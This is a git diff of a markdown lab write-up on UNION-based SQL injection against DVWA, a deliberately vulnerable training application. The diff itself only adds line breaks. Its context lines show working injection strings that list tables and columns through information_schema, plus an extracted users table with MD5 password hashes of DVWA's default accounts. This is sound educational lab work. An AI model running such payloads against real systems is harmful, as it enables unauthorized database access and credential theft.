@@ -41,7 +41,7 @@
 | 2 | Based on the name of the database we get the tables | `' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa' #` | <img width="439" height="256" alt="image" src="https://github.com/user-attachments/assets/85ab4312-9743-4b7f-afc2-6d7ba70fe682" /> |
 | 3 | Based on each table we get the columns  | `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='guestbook' #` | <img width="426" height="282" alt="image" src="https://github.com/user-attachments/assets/8e1a7cd4-8fa0-44dd-bc86-c273ba1463e7" /> |
 
-</div>
+</div><br>
 
 These are the tables, their columns and the data we extracted.
 
@@ -62,7 +62,7 @@ The query I used: <br>
 | :-----------: | :----------: | :----------: |
 | 1 | This is a test comment. | test |
 
-</div>
+</div> <br>
 
 The query I used: <br>
 ``` 
@@ -90,4 +90,4 @@ The query I used: <br>
 | 4 | Pablo | Picasso | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | /hackable/users/pablo.jpg | 2025-10-21 14:45:24 | 0 |
 | 5 | Bob | Smith | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | /hackable/users/smithy.jpg | 2025-10-21 14:45:24 | 0 |
 
-</div>
+</div><br>
